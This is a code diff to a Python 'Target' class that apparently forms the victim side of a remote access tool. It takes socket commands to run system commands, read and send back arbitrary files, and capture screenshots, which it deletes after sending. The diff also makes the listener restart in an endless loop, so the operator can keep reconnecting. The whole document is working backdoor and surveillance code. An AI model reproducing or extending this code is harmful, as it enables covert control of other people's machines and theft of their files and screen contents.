@@ -1,4 +1,5 @@
-from base import *
+from base_socket import *
+from string_coloring import CYAN
 from PIL import ImageGrab
 import subprocess
 from spliter import commande_spliter
@@ -10,13 +11,13 @@ class Target(ServerSocket):
 
     def run(self):
         while True:
-            commande = self.recv_header_data(show_progress=False).decode(encoding=ENCODING)
+            commande = self.recv_header_and_data().decode(encoding=ENCODING)
             splited_commande = commande_spliter(commande)
 
             if not commande:
                 break
 
-            elif commande.lower() == 'exit':
+            elif commande == 'exit':
                 break
 
             elif commande.lower() == 'os':
@@ -33,7 +34,7 @@ class Target(ServerSocket):
                     result = colored_error(str(err))
                     print(result)
 
-            elif splited_commande[0] == 'dl':
+            elif splited_commande[0] == 'download':
                 try:
                     with open(splited_commande[1], 'rb') as f:
                         result = f.read()
@@ -50,6 +51,7 @@ class Target(ServerSocket):
                     image.save(splited_commande[1], 'png')
                     with open(splited_commande[1], 'rb') as img:
                         result = img.read()
+                    os.remove(splited_commande[1])
                 except OSError as err:
                     print(str(err))
                     result = 'screenshot-error'
@@ -67,11 +69,11 @@ class Target(ServerSocket):
                 print(f'{CYAN} ⌨️   > {commande}')
 
             if not result:
-                self.send_header_data(colored_error(f'❗ Erreur!').encode())
+                self.send_header_and_data(colored_error(f'❗ Erreur!').encode())
             else:
                 if isinstance(result, str):
                     result = result.encode(encoding=ENCODING)
-                self.send_header_data(result)
+                self.send_header_and_data(result)
 
         print(colored_success(f'\n‼️ Deconnecte\n'))
         self.clientsocket.close()
@@ -79,6 +81,8 @@ class Target(ServerSocket):
 
 
 if __name__ == '__main__':
-    target = Target()
-    target.listen()
-    target.run()
+
+    while True:
+        target = Target()
+        target.listen()
+        target.run()
